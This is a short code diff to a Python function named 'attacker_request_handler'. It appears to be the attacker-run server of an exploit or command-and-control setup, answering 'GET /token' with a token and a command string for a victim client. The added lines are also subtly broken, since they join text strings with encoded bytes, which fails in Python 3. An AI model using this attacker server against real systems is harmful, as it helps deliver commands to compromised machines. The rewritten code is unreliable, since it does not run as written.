@@ -40,9 +40,13 @@ def attacker_request_handler(conn, addr, client_data):
         #        break
         total_data += data
         if b"GET /token" in total_data:
-            conn.sendall(b"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{\"token\":\"" +
-                         client_data.token.encode() + b"\", \"commandString\":\"" +
-                         client_data.commandString.encode() + b"\"}")
+            data_string = "{\"token\":\"" + client_data.token.encode() + "\"," \
+                          "\"commandString\":\"" + client_data.commandString.encode() + "\"}"
+            send_string = "HTTP/1.1 200 OK\r\n" + \
+                         "Content-Type: application/json; charset=UTF-8\r\n" + \
+                         "Content-Length: " + str(len(data_string)) + "\r\n" + \
+                         "Connection: close\r\n\r\n" + data_string
+            conn.sendall(send_string.encode())
         else:
             conn.sendall(b"HTTP/1.1 404 Not Found\r\n\r\n")
 
